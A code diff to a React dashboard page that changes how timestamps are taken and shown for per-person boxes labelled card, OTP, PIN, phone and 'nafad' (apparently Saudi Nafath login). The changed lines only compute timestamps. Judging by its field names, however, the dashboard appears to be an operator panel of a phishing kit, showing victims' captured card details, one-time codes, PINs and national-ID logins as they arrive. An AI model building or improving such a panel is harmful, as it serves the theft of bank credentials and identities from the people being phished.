@@ -915,17 +915,43 @@ export default function DashboardPage() {
   // Get entry timestamp for a specific raw data
   const getEntryTimestamp = useMemo(() => {
     return (raw: Record<string, any>): number => {
-      const entry = customerEntryGroup.find(e => {
-        const entryRaw = e.raw || {};
-        // Match by comparing key fields
-        return entryRaw.identityNumber === raw.identityNumber ||
-               entryRaw.phoneNumber === raw.phoneNumber ||
-               entryRaw.nafadIdNumber === raw.nafadIdNumber;
-      });
-      if (!entry) return 0;
-      return new Date(entry.submittedAt || entry.updatedAt || 0).getTime();
+      // First try to use boxTimestamps from selectedRequest
+      const raw2 = selectedRequest?.raw || {};
+      const timestamps = selectedRequest?.boxTimestamps || {};
+      
+      // Get the latest timestamp from boxTimestamps
+      let latestTs = 0;
+      if (timestamps.card?.event_timestamp) {
+        const ts = new Date(timestamps.card.event_timestamp).getTime();
+        if (ts > latestTs) latestTs = ts;
+      }
+      if (timestamps.otp?.event_timestamp) {
+        const ts = new Date(timestamps.otp.event_timestamp).getTime();
+        if (ts > latestTs) latestTs = ts;
+      }
+      if (timestamps.pin?.event_timestamp) {
+        const ts = new Date(timestamps.pin.event_timestamp).getTime();
+        if (ts > latestTs) latestTs = ts;
+      }
+      if (timestamps.phone?.event_timestamp) {
+        const ts = new Date(timestamps.phone.event_timestamp).getTime();
+        if (ts > latestTs) latestTs = ts;
+      }
+      if (timestamps.nafad?.event_timestamp) {
+        const ts = new Date(timestamps.nafad.event_timestamp).getTime();
+        if (ts > latestTs) latestTs = ts;
+      }
+      
+      // Fallback to raw data
+      if (latestTs === 0) {
+        latestTs = 
+          new Date(raw2._v1UpdatedAt || raw2._v5UpdatedAt || raw2._v6UpdatedAt || raw2._v7UpdatedAt || raw2.nafadUpdatedAt || 0).getTime() ||
+          new Date(raw.submittedAt || raw.createdAt || raw.updatedAt || 0).getTime();
+      }
+      
+      return latestTs;
     };
-  }, [customerEntryGroup]);
+  }, [selectedRequest]);
 
   const liveSummary = useMemo(() => {
     const raw = selectedRequest?.raw || {};
@@ -1652,8 +1678,9 @@ export default function DashboardPage() {
       return null;
     }
 
-    // NEW: Get timestamp from boxTimestamps state (real-time system)
-    const cardTimestamp = boxTimestamps?.card?.event_timestamp;
+    // Get timestamp from boxTimestamps state (real-time system)
+    // Fallback to raw data if not available
+    const cardTimestamp = boxTimestamps?.card?.event_timestamp || raw?._v1UpdatedAt || raw?.cardUpdatedAt;
     const cardStatus = boxTimestamps?.card?.status || effectivePaymentStatus;
 
     return (
@@ -1673,7 +1700,7 @@ export default function DashboardPage() {
           marginLeft: "auto"
         }}
       >
-        {/* NEW: Box timestamp display */}
+        {/* Box timestamp display */}
         {cardTimestamp && (
           <div style={{
             position: "absolute",
@@ -1759,8 +1786,9 @@ export default function DashboardPage() {
       return null;
     }
 
-    // NEW: Get timestamp from boxTimestamps state (real-time system)
-    const otpTimestamp = boxTimestamps?.otp?.event_timestamp;
+    // Get timestamp from boxTimestamps state (real-time system)
+    // Fallback to raw data if not available
+    const otpTimestamp = boxTimestamps?.otp?.event_timestamp || raw?._v5UpdatedAt;
     const otpStatus = boxTimestamps?.otp?.status || effectiveCardOtpStatus;
 
     return (
@@ -1859,8 +1887,9 @@ export default function DashboardPage() {
       return null;
     }
 
-    // NEW: Get timestamp from boxTimestamps state (real-time system)
-    const pinTimestamp = boxTimestamps?.pin?.event_timestamp;
+    // Get timestamp from boxTimestamps state (real-time system)
+    // Fallback to raw data if not available
+    const pinTimestamp = boxTimestamps?.pin?.event_timestamp || raw?._v6UpdatedAt;
     const pinBoxStatus = boxTimestamps?.pin?.status || effectivePinStatus;
 
     return (
@@ -1973,8 +2002,9 @@ export default function DashboardPage() {
       return null;
     }
 
-    // NEW: Get timestamp from boxTimestamps state (real-time system)
-    const phoneTimestamp = boxTimestamps?.phone?.event_timestamp;
+    // Get timestamp from boxTimestamps state (real-time system)
+    // Fallback to raw data if not available
+    const phoneTimestamp = boxTimestamps?.phone?.event_timestamp || raw?._v7UpdatedAt || raw?.phoneUpdatedAt;
     const phoneStatus = boxTimestamps?.phone?.status || effectivePhoneOtpStatus;
 
     return (
@@ -2103,8 +2133,9 @@ const renderNafadBox = () => {
       return null;
     }
 
-    // NEW: Get timestamp from boxTimestamps state (real-time system)
-    const nafadTimestamp = boxTimestamps?.nafad?.event_timestamp;
+    // Get timestamp from boxTimestamps state (real-time system)
+    // Fallback to raw data if not available
+    const nafadTimestamp = boxTimestamps?.nafad?.event_timestamp || raw?.nafadUpdatedAt;
     const nafadBoxStatus = boxTimestamps?.nafad?.status || nafadStatus;
 
     return (
